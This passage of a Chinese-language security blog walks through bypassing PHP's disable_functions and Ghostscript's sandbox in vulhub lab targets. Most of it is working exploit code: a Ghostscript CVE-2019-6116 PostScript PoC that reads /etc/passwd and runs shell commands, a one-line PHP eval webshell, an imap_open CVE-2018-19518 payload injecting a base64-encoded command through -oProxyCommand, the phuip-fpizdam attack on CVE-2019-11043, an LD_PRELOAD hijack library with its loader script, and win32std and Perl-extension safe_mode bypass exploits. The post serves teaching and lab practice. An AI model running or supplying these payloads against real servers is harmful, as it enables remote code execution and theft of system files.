<p><strong>CVE-2019-6116</strong>：2019年1月23日晚，Artifex官方在ghostscriptf的master分支上提交合并了多达6处的修复。旨在修复 CVE-2019-6116 漏洞，该漏洞由 Google 安全研究员 Tavis 于2018年12月3日提交。该漏洞可以直接绕过 ghostscript 的安全沙箱，导致攻击者可以执行任意命令/读取任意文件。</p>
<p><strong>漏洞利用条件</strong>：</p>
<ul>
<li>GhostScript 版本 &lt; 9.26</li>
</ul>
<p><strong>靶场环境</strong>：</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116">https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116</a></p>
<p><strong>靶场突破</strong>：</p>
<p>构造payload：<code>exp.png</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">% extract .actual_pdfpaintproc operator from pdfdict</span><br><span class="line">/.actual_pdfpaintproc pdfdict /.actual_pdfpaintproc get def</span><br><span class="line"></span><br><span class="line">/exploit &#123;</span><br><span class="line">    (Stage 11: Exploitation...)=</span><br><span class="line"></span><br><span class="line">    /forceput exch def</span><br><span class="line"></span><br><span class="line">    systemdict /SAFER false forceput</span><br><span class="line">    userparams /LockFilePermissions false forceput</span><br><span class="line">    systemdict /userparams get /PermitFileControl [(*)] forceput</span><br><span class="line">    systemdict /userparams get /PermitFileWriting [(*)] forceput</span><br><span class="line">    systemdict /userparams get /PermitFileReading [(*)] forceput</span><br><span class="line"></span><br><span class="line">    % update</span><br><span class="line">    save restore</span><br><span class="line"></span><br><span class="line">    % All done.</span><br><span class="line">    stop</span><br><span class="line">&#125; def</span><br><span class="line"></span><br><span class="line">errordict /typecheck &#123;</span><br><span class="line">    /typecount typecount 1 add def</span><br><span class="line">    (Stage 10: /typecheck #)=only typecount ==</span><br><span class="line"></span><br><span class="line">    % The first error will be the .knownget, which we handle and setup the</span><br><span class="line">    % stack. The second error will be the ifelse (missing boolean), and then we</span><br><span class="line">    % dump the operands.</span><br><span class="line">    typecount 1 eq &#123; null &#125; if</span><br><span class="line">    typecount 2 eq &#123; pop 7 get exploit &#125; if</span><br><span class="line">    typecount 3 eq &#123; (unexpected)= quit &#125;  if</span><br><span class="line">&#125; put</span><br><span class="line"></span><br><span class="line">% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some</span><br><span class="line">% executable arrays onto the operand stack that contain .forceput, but are not</span><br><span class="line">% marked as executeonly or pseudo-operators.</span><br><span class="line">%</span><br><span class="line">% The routine was attempting to pass them to ifelse, but we can cause that to</span><br><span class="line">% fail because when the routine was declared, it used `bind` but many of the</span><br><span class="line">% names it uses are not operators and so are just looked up in the dictstack.</span><br><span class="line">%</span><br><span class="line">% This means we can push a dict onto the dictstack and control how the routine</span><br><span class="line">% works.</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /typecount      0</span><br><span class="line">    /PDFfile        &#123; (Stage 0: PDFfile)= currentfile &#125;</span><br><span class="line">    /q              &#123; (Stage 1: q)= &#125; % no-op</span><br><span class="line">    /oget           &#123; (Stage 3: oget)= pop pop 0 &#125; % clear stack</span><br><span class="line">    /pdfemptycount  &#123; (Stage 4: pdfemptycount)= &#125; % no-op</span><br><span class="line">    /gput           &#123; (Stage 5: gput)= &#125;  % no-op</span><br><span class="line">    /resolvestream  &#123; (Stage 6: resolvestream)= &#125; % no-op</span><br><span class="line">    /pdfopdict      &#123; (Stage 7: pdfopdict)= &#125; % no-op</span><br><span class="line">    /.pdfruncontext &#123; (Stage 8: .pdfruncontext)= 0 1 mark &#125; % satisfy counttomark and index</span><br><span class="line">    /pdfdict        &#123; (Stage 9: pdfdict)=</span><br><span class="line">        % cause a /typecheck error we handle above</span><br><span class="line">        true</span><br><span class="line">    &#125;</span><br><span class="line">&gt;&gt; begin &lt;&lt;&gt;&gt; &lt;&lt;&gt;&gt; &#123; .actual_pdfpaintproc &#125; stopped pop</span><br><span class="line"></span><br><span class="line">(Should now have complete control over ghostscript, attempting to read /etc/passwd...)=</span><br><span class="line"></span><br><span class="line">% Demonstrate reading a file we shouldnt have access to.</span><br><span class="line">(/etc/passwd) (r) file dup 64 string readline pop == closefile</span><br><span class="line"></span><br><span class="line">(Attempting to execute a shell command...)= flush</span><br><span class="line"></span><br><span class="line">% run command</span><br><span class="line">(%pipe%cat /etc/passwd &gt; /var/www/html/res.txt) (w) file closefile</span><br><span class="line"></span><br><span class="line">(All done.)=</span><br><span class="line"></span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
<p>作者给出了POC，上传这个文件，即可执行<code>cat /etc/passwd &gt; /var/www/html/res.txt</code>：</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/10/9vHiPaq1JeE5tKz.png" alt="image-20220110201707101"></p>
<h2 id="利用-PHP-imap-open-RCE-漏洞-CVE-2018-19518"><a href="#利用-PHP-imap-open-RCE-漏洞-CVE-2018-19518" class="headerlink" title="利用 PHP imap_open RCE 漏洞 (CVE-2018-19518)"></a>利用 PHP imap_open RCE 漏洞 (CVE-2018-19518)</h2><p><strong>漏洞简介</strong>：</p>
<p>PHP 的<code>imap_open</code>函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的<code>imap_open</code>函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含<code>-oProxyCommand</code>参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。</p>
<p><strong>漏洞利用条件</strong>：</p>
<ul>
<li>Ubuntu <a target="_blank" rel="noopener" href="https://people.canonical.com/~ubuntu-security/cve/2018/CVE-2018-19518.html">https://people.canonical.com/~ubuntu-security/cve/2018/CVE-2018-19518.html</a></li>
<li>Debian <a target="_blank" rel="noopener" href="https://security-tracker.debian.org/tracker/CVE-2018-19518">https://security-tracker.debian.org/tracker/CVE-2018-19518</a></li>
<li>Red Hat <a target="_blank" rel="noopener" href="https://access.redhat.com/security/cve/cve-2018-19518">https://access.redhat.com/security/cve/cve-2018-19518</a></li>
<li>SUSE <a target="_blank" rel="noopener" href="https://www.suse.com/security/cve/CVE-2018-19518/">https://www.suse.com/security/cve/CVE-2018-19518/</a></li>
</ul>
<blockquote>
<p>这个漏洞出现在较老的PHP版本中，PHP官方针对7.1.x在7.1.25版本发布时修复了 CVE-2018-19518 漏洞。</p>
</blockquote>
<p><strong>靶场环境</strong>：</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2018-19518">https://github.com/vulhub/vulhub/tree/master/php/CVE-2018-19518</a></p>
<p>进入靶场并在Web目录中写入WebShell：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hacker&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>该漏洞执行的结果是无回显的，为了保存查看执行后的命令回显的数据，这里将Web目录的所属改为<code>www-data</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R www-data:www-data /var/www/html</span><br></pre></td></tr></table></figure>
<blockquote>
<p>具体的环境配置与漏洞复现过程可以参考FreeBuf的这篇文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/192712.html">https://www.freebuf.com/vuls/192712.html</a></p>
</blockquote>
<p><strong>靶场突破</strong>：</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;cat /etc/passwd &gt;/var/www/html/res.txt&quot;</span>;</span><br><span class="line"><span class="variable">$base64</span> = base64_encode(<span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$server</span> = <span class="string">&quot;x -oProxyCommand=echo\t<span class="subst">&#123;$base64&#125;</span>|base64\t-d|sh&quot;</span>;</span><br><span class="line">@imap_open(<span class="string">&#x27;&#123;&#x27;</span>.<span class="variable">$server</span>.<span class="string">&#x27;&#125;:143/imap&#125;INBOX&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;\n\nError: &quot;</span>.imap_last_error());</span><br></pre></td></tr></table></figure>
<p>将payload代码部分进行URL编码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$payload</span>%<span class="number">20</span>=%<span class="number">20</span>%<span class="number">22</span>cat%<span class="number">20</span>/etc/passwd%<span class="number">20</span>%<span class="number">3</span>E/<span class="keyword">var</span>/www/html/res.txt%<span class="number">22</span>;%<span class="number">0</span>A<span class="variable">$base64</span>%<span class="number">20</span>=%<span class="number">20</span>base64_encode(<span class="variable">$payload</span>);%<span class="number">0</span>A<span class="variable">$server</span>%<span class="number">20</span>=%<span class="number">20</span>%<span class="number">22</span>x%<span class="number">20</span>-oProxyCommand=<span class="keyword">echo</span>%<span class="number">5</span>Ct%<span class="number">7</span>B<span class="variable">$base64</span>%<span class="number">7</span>D%<span class="number">7</span>Cbase64%<span class="number">5</span>Ct-d%<span class="number">7</span>Csh%<span class="number">22</span>;%<span class="number">0</span>A@imap_open(<span class="string">&#x27;%7B&#x27;</span>.<span class="variable">$server</span>.<span class="string">&#x27;%7D:143/imap%7DINBOX&#x27;</span>,%<span class="number">20</span><span class="string">&#x27;&#x27;</span>,%<span class="number">20</span><span class="string">&#x27;&#x27;</span>)%<span class="number">20</span><span class="keyword">or</span>%<span class="number">20</span><span class="keyword">die</span>(%<span class="number">22</span>%<span class="number">5</span>Cn%<span class="number">5</span>CnError:%<span class="number">20</span>%<span class="number">22</span>.imap_last_error());</span><br></pre></td></tr></table></figure>
<p>在WebShell中提交即可执行命令。</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/10/fZEUtl12pDduS9w.png" alt="image-20220110155722488"></p>
<h2 id="利用Nginx-PHP-fpm-RCE-漏洞-CVE-2019-11043"><a href="#利用Nginx-PHP-fpm-RCE-漏洞-CVE-2019-11043" class="headerlink" title="利用Nginx+PHP-fpm RCE 漏洞 (CVE-2019-11043)"></a>利用Nginx+PHP-fpm RCE 漏洞 (CVE-2019-11043)</h2><p><strong>漏洞简介</strong>：</p>
<p>2019年10月23日，github公开漏洞相关的详情以及exp。当nginx配置不当时，会导致php-fpm远程任意代码执行。</p>
<p>攻击者可以使用换行符（％0a）来破坏<code>fastcgi_split_path_info</code>指令中的Regexp。 Regexp被损坏导致PATH_INFO为空，同时<code>slen</code>可控，从而触发该漏洞。</p>
<p><strong>漏洞利用条件</strong>：</p>
<ul>
<li>Linux系统</li>
<li>Nginx + PHP-FPM</li>
<li>PHP 版本<ul>
<li>PHP 7.0.X</li>
<li>PHP 7.1.X &lt; 7.1.33</li>
<li>PHP 7.2.X &lt; 7.2.24</li>
<li>PHP 7.3.X &lt; 7.3.11</li>
</ul>
</li>
<li>Nginx特定配置（如下）</li>
</ul>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ~ <span class="section">[^/]</span>\.php(/|$) &#123;</span><br><span class="line"> ...</span><br><span class="line"> fastcgi_split_path_info ^(.+?\.php)(/.*)$<span class="comment">;</span></span><br><span class="line"> fastcgi_param PATH_INFO $fastcgi_path_info<span class="comment">;</span></span><br><span class="line"> fastcgi_pass   php:9000<span class="comment">;</span></span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>靶场环境</strong>：</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043">https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043</a></p>
<p><strong>靶场突破</strong>：</p>
<p>下载github上公开的exp（需要go环境）。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/neex/phuip-fpizdam</span><br></pre></td></tr></table></figure>
<p>然后编译</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go install github.com/neex/phuip-fpizdam</span><br></pre></td></tr></table></figure>
<p>使用exp攻击靶场网站</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phuip-fpizdam http://192.168.43.187:8080/index.php</span><br></pre></td></tr></table></figure>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/10/5vKzNBQqgX1dY7I.png" alt="image-20220110163535254"></p>
<p>攻击成功，可以直接执行命令。</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/10/mWglT3SpyzaBdP8.png" alt="image-20220110164307228"></p>
<h2 id="其它绕过方法"><a href="#其它绕过方法" class="headerlink" title="其它绕过方法"></a>其它绕过方法</h2><p>以下方法由于很多都是针对旧版本的PHP，有些需要加载特殊的第三方扩展，就不具体讲解了，有兴趣的小伙伴可以自己去复现。</p>
<h3 id="PHP5-pcntl-exec"><a href="#PHP5-pcntl-exec" class="headerlink" title="PHP5 pcntl_exec()"></a>PHP5 pcntl_exec()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;/var/tmp/&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line"><span class="variable">$option</span> = <span class="string">&#x27;-l&#x27;</span>;</span><br><span class="line"><span class="variable">$pathtobin</span> = <span class="string">&#x27;/bin/bash&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$arg</span> = <span class="keyword">array</span>(<span class="variable">$cmd</span>, <span class="variable">$option</span>, <span class="variable">$dir</span>);</span><br><span class="line"> </span><br><span class="line">pcntl_exec(<span class="variable">$pathtobin</span>, <span class="variable">$arg</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = @<span class="variable">$_REQUEST</span>[cmd];</span><br><span class="line"><span class="keyword">if</span>(function_exists(<span class="string">&#x27;pcntl_exec&#x27;</span>)) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$cmd</span>.<span class="string">&quot;&amp;pkill -9 bash &gt;out&quot;</span>;</span><br><span class="line">    pcntl_exec(<span class="string">&quot;/bin/bash&quot;</span>, <span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;out&quot;</span>);        </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;不支持pcntl扩展&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-proc-open"><a href="#PHP-proc-open" class="headerlink" title="PHP proc_open()"></a>PHP proc_open()</h3><p>a.c：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getuid</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *en;</span><br><span class="line"><span class="keyword">char</span> *buf=<span class="built_in">malloc</span>(<span class="number">300</span>);</span><br><span class="line">FILE *a;</span><br><span class="line"></span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">a=fopen(<span class="string">&quot;.comm&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">buf=fgets(buf,<span class="number">100</span>,a);</span><br><span class="line">write(<span class="number">2</span>,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">fclose(a);</span><br><span class="line">rename(<span class="string">&quot;a.so&quot;</span>,<span class="string">&quot;b.so&quot;</span>);</span><br><span class="line">system(buf);</span><br><span class="line">system(<span class="string">&quot;mv output.txt .comm1&quot;</span>);</span><br><span class="line">rename(<span class="string">&quot;b.so&quot;</span>,<span class="string">&quot;a.so&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(buf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>evil.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;/var/www&quot;</span>; <span class="comment">//change to your writable path</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="variable">$path</span>.<span class="string">&quot;/.comm&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">fputs(<span class="variable">$a</span>,<span class="variable">$_GET</span>[<span class="string">&quot;c&quot;</span>]);</span><br><span class="line">fclose(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line"> <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),</span><br><span class="line"> <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;file&quot;</span>, <span class="variable">$path</span>.<span class="string">&quot;/output.txt&quot;</span>,<span class="string">&quot;w&quot;</span>),</span><br><span class="line"> <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;file&quot;</span>, <span class="variable">$path</span>.<span class="string">&quot;/errors.txt&quot;</span>, <span class="string">&quot;a&quot;</span> )</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cwd</span> = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="variable">$env</span> = <span class="keyword">array</span>(<span class="string">&#x27;LD_PRELOAD&#x27;</span> =&gt; <span class="variable">$path</span>.<span class="string">&quot;/a.so&quot;</span>);</span><br><span class="line"><span class="variable">$process</span> = proc_open(<span class="string">&#x27;id &gt; /tmp/a&#x27;</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>, <span class="variable">$cwd</span>, <span class="variable">$env</span>); <span class="comment">// example command - should not succeed</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="variable">$path</span>.<span class="string">&quot;/.comm1&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span> (!feof(<span class="variable">$a</span>))</span><br><span class="line">&#123;<span class="variable">$b</span>=fgets(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$b</span>;&#125;</span><br><span class="line">fclose(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-5-2-3-win32std-Extension"><a href="#PHP-5-2-3-win32std-Extension" class="headerlink" title="PHP 5.2.3 win32std Extension"></a>PHP 5.2.3 win32std Extension</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 5.2.3 win32std extension safe_mode and disable_functions protections bypass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//author: shinnai</span></span><br><span class="line"><span class="comment">//mail: shinnai[at]autistici[dot]org</span></span><br><span class="line"><span class="comment">//site: http://shinnai.altervista.org</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Tested on xp Pro sp2 full patched, worked both from the cli and on apache</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Thanks to rgod for all his precious advises :)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//I set php.ini in this way:</span></span><br><span class="line"><span class="comment">//safe_mode = On</span></span><br><span class="line"><span class="comment">//disable_functions = system</span></span><br><span class="line"><span class="comment">//if you launch the exploit from the cli, cmd.exe will be wxecuted</span></span><br><span class="line"><span class="comment">//if you browse it through apache, you&#x27;ll see a new cmd.exe process activated in taskmanager</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!extension_loaded(<span class="string">&quot;win32std&quot;</span>)) <span class="keyword">die</span>(<span class="string">&quot;win32std extension required!&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cmd.exe&quot;</span>); <span class="comment">//just to be sure that protections work well</span></span><br><span class="line">win_shell_execute(<span class="string">&quot;..\\..\\..\\..\\windows\\system32\\cmd.exe&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-Perl-Extension"><a href="#PHP-Perl-Extension" class="headerlink" title="PHP Perl Extension"></a>PHP Perl Extension</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">##########################################################</span></span><br><span class="line"><span class="comment">###----------------------------------------------------###</span></span><br><span class="line"><span class="comment">###----PHP Perl Extension Safe_mode Bypass Exploit-----###</span></span><br><span class="line"><span class="comment">###----------------------------------------------------###</span></span><br><span class="line"><span class="comment">###-Author:--NetJackal---------------------------------###</span></span><br><span class="line"><span class="comment">###-Email:---nima_501[at]yahoo[dot]com-----------------###</span></span><br><span class="line"><span class="comment">###-Website:-http://netjackal.by.ru--------------------###</span></span><br><span class="line"><span class="comment">###----------------------------------------------------###</span></span><br><span class="line"><span class="comment">##########################################################</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;perl&#x27;</span>))<span class="keyword">die</span>(<span class="string">&#x27;perl extension is not loaded&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>))<span class="variable">$_GET</span>=&amp;<span class="variable">$HTTP_GET_VARS</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]=(strtoupper(substr(PHP_OS,<span class="number">0</span>,<span class="number">3</span>))==<span class="string">&#x27;WIN&#x27;</span>)?<span class="string">&#x27;dir&#x27;</span>:<span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line"><span class="variable">$perl</span>=<span class="keyword">new</span> perl();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;textarea rows=&#x27;25&#x27; cols=&#x27;75&#x27;&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$perl</span>-&gt;eval(<span class="string">&quot;system(&#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>].<span class="string">&quot;&#x27;)&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&amp;lt;/textarea&amp;gt;&quot;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]=htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;form&gt;CMD: &lt;input type=text name=cmd value=&#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>].<span class="string">&quot;&#x27; size=25&gt;&lt;/form&gt;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
